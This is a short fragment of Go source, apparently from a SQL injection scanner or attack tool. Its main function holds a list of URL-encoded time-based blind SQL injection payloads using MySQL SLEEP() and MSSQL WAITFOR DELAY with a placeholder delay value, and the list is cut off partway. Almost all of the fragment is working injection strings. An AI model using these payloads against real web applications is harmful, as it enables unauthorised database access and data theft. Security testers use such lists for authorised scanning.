...
func main() {
	...
	payloads := []string{
		...
		"'%20AND%20SLEEP(tempoSQLi)#",
		"'%20AND%20SLEEP(tempoSQLi)--",		
		"'%20AND%20SLEEP(tempoSQLi)%20AND%20'Jzur'='Jzur",
		"'%20OR%20SLEEP(tempoSQLi)%20OR%20'Jzur'='Jzur",
		"%20AnD%20SLEEP(tempoSQLi)--",
		"'%20AnD%20SLEEP(tempoSQLi)%20ANd%20'1",
		"%20and%20WAITFOR%20DELAY%20'tempoSQLi'",
		"%20and%20WAITFOR%20DELAY%20'tempoSQLi'--",
		")%20IF%20(1=1)%20WAITFOR%20DELAY%20'tempoSQLi'--",
